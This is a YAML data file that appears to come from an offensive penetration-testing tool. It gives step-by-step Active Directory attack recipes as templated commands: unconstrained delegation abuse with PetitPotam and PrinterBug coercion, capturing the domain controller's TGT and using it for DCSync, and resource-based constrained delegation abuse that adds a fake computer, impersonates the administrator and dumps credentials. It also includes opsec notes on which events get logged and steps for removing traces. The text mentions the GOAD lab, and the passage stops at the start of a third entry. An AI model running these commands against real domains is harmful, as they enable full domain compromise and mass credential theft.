  - id: unconstrained_deleg_coerce
    name: Unconstrained Delegation — Coerce + TGT Capture
    tab: Privilege Escalation
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - TARGET_IP
      - ATTACKER_IP
    requires_priv: null
    tags:
      - unconstrained
      - delegation
      - coerce
      - tgt-capture
    description: >
      Compromise a host with unconstrained delegation, then coerce DC
      authentication via PrinterBug or PetitPotam. The DC's TGT arrives
      at the compromised host and can be used for DCSync.
      GOAD has multiple hosts with unconstrained delegation.
    commands:
      - label: "Find unconstrained delegation hosts"
        cmd: "impacket-findDelegation {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: "Find with NetExec LDAP"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M get-uncdelegation"
      - label: "Coerce DC auth to compromised unconstrained host (PetitPotam)"
        cmd: "python3 PetitPotam.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {TARGET_IP} {DC_IP}"
      - label: "Coerce via PrinterBug"
        cmd: "python3 printerbug.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} {TARGET_IP}"
      - label: "Extract captured DC TGT (run on compromised host)"
        cmd: "Rubeus.exe dump /service:krbtgt /nowrap"
      - label: "Use captured TGT for DCSync"
        cmd: "export KRB5CCNAME=/tmp/dc.ccache && impacket-secretsdump -k -no-pass {DC_IP}"
    next:
      - DCSync all domain credentials
      - Create golden ticket
      - Enumerate cross-domain trust paths
    opsec: >
      Coercion is loud and generates network events. TGT extraction requires
      local admin on the unconstrained host. Monitor for auth coercion alerts.
    cleanup:
      - label: "Remove TGT files"
        cmd: "rm -f /tmp/dc.ccache"

  - id: rbcd_attack
    name: Resource-Based Constrained Delegation — RBCD
    tab: Privilege Escalation
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - TARGET_COMPUTER
    requires_priv: null
    tags:
      - rbcd
      - delegation
      - privesc
      - writeable-acl
    description: >
      Abuse write access over a computer object to configure RBCD and
      impersonate DA on that target. GOAD has ACL misconfigurations giving
      domain users write access over computer accounts.
      Also achievable via NTLM relay to LDAP.
    commands:
      - label: "Step 1 — Add attacker-controlled computer"
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -computer-name 'ATTACKPC$' -computer-pass 'AttackPass123!' -dc-ip {DC_IP}"
      - label: "Step 2 — Set RBCD on target — allow ATTACKPC to delegate"
        cmd: "python3 rbcd.py -f ATTACKPC -t {TARGET_COMPUTER} {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: "Step 3 — S4U2Proxy — get service ticket as administrator"
        cmd: "impacket-getST -spn 'cifs/{TARGET_COMPUTER}.{DOMAIN}' -impersonate administrator {DOMAIN}/ATTACKPC$:'AttackPass123!' -dc-ip {DC_IP}"
      - label: "Step 4 — Use ticket to access target"
        cmd: "export KRB5CCNAME=./administrator@cifs_{TARGET_COMPUTER}.{DOMAIN}.ccache && impacket-smbexec -k -no-pass {DOMAIN}/administrator@{TARGET_COMPUTER}.{DOMAIN}"
      - label: "Step 5 — Dump credentials on target"
        cmd: "export KRB5CCNAME=./administrator@cifs_{TARGET_COMPUTER}.{DOMAIN}.ccache && impacket-secretsdump -k -no-pass {DOMAIN}/administrator@{TARGET_COMPUTER}.{DOMAIN}"
    next:
      - Dump credentials if target is a DC — use for DCSync
      - Use admin access for lateral movement to other hosts
    opsec: >
      Computer account creation (4741) and msDS-AllowedToActOnBehalfOfOtherIdentity
      modification (5136) are logged. EDR will flag. Clean up immediately.
    cleanup:
      - label: "Remove fake computer account"
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -computer-name 'ATTACKPC$' -delete -dc-ip {DC_IP}"
      - label: "Remove RBCD attribute"
        cmd: "python3 rbcd.py -f ATTACKPC -t {TARGET_COMPUTER} {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} --remove"
      - label: "Remove ticket files"
        cmd: "rm -f ./administrator*.ccache"

  - id: constrained_deleg_s4u
